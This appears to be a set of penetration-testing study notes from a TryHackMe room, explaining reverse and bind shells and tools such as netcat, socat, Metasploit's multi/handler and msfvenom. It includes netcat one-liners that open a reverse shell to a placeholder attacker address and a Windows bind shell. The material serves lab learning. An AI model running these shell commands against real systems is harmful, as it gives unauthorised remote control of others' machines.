# Shells
In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

# Types of shells
## Reverse shells
Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you could set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.
```bash
# On your own computer, set up a listener on port 4444
sudo nc -lvpn 4444

# On the target, execute the following code
nc <LOCAL-IP> <PORT> -e /bin/bash
```	

## Bind shells
Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

```bash 
# On your own computer, execute the following code
nc <LOCAL-IP> <PORT>

# On the target, execute the following code (Windows)
nc -lp <PORT> -e "cmd.exe"
```

# Tools
## Netcat
Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by some techniques.


## Socat
Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

Both Socat and Netcat have .exe versions for use on Windows.

## Metasploit - multi/handler
The auxiliary/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads

## msfvenom
Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells.

# Interactivity
## Interactive shells
Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt. The user types either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.


## Non-interactive shells
Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. 

Suffice to say that interactive programs do not work in non-interactive shells.
